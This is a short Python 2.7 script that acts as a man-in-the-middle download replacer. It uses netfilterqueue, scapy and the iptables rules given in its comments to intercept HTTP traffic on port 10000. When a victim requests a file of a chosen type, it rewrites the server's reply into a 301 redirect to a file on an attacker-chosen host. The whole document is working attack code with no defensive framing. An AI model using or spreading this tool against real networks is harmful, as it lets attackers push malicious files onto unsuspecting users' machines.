#!/usr/bin/python2.7
# iptables -I INPUT -j NFQUEUE --queue-num 0
# iptables -I OUTPUT -j NFQUEUE --queue-num 0
# iptables -I FORWARD -j NFQUEUE --queue-num 0

import netfilterqueue
import scapy.all as scapy
import argparse
import re

ack_list=[]
file_type = None
target_file = None
host = None
def get_argument():
    parser = argparse.ArgumentParser()
    parser.add_argument("-e", "--extension", dest="extension", help="File type to replace download")
    parser.add_argument("-t", "--target", dest="target", help="Target file full path")
    parser.add_argument("-s", "--server", dest="server", help="Target file host")
    options = parser.parse_args()
    if not options.extension:
        parser.error("[-]Please specify target file type")
    elif not options.target:
        parser.error("[-]Please provide path for new file")
    elif not options.server:
        parser.error("[-]Please provide host ip for new file")
    return options

def set_load(packet,load):
    packet[scapy.Raw].load=load
    if packet[scapy.IP].len:
        del packet[scapy.IP].len
    if packet[scapy.IP].chksum:
        del packet[scapy.IP].chksum
    if packet[scapy.TCP].chksum:
        del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    global file_type
    global target_file
    global host
    scapy_packet=scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(scapy.TCP):
        if scapy_packet[scapy.TCP].dport == 10000:
            if file_type in scapy_packet[scapy.Raw].load and host not in scapy_packet[scapy.Raw].load:
                print("[+] "+file_type+" Requested..")
                ack_list.append(scapy_packet[scapy.TCP].ack)
                #print scapy_packet.show()

        elif scapy_packet[scapy.TCP].sport == 10000:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print('[+] Replacing file with target')
                modified_packet = set_load(scapy_packet,"HTTP/1.1 301 Moved Permanently\nLocation: "+target_file+"\n\n")

                packet.set_payload(str(modified_packet))

    packet.accept()

options = get_argument()
file_type = options.extension
target_file = options.target
host = options.server
if not "." in file_type:
    file_type = "."+file_type

if not "http://" in target_file:
    target_file = "http://"+target_file

try:
    queue=netfilterqueue.NetfilterQueue()
    queue.bind(0,process_packet)
    queue.run()
except KeyboardInterrupt:
    print("\n[*] Detected CTRL + C ....... Quitting.")
    